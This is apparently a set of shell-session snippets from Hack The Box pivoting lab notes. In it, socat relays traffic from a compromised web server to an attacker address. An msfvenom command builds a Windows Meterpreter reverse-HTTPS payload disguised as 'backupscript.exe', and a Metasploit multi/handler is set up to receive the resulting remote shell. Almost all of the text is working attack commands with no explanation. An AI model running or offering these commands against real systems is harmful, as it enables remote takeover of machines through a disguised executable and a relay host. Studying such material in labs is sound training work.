```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

```shell-session
AhmaDb0x@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

```shell-session
msf6 > use exploit/multi/handler


msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https

msf6 exploit(multi/handler) > set lhost 0.0.0.0

msf6 exploit(multi/handler) > set lport 80

msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

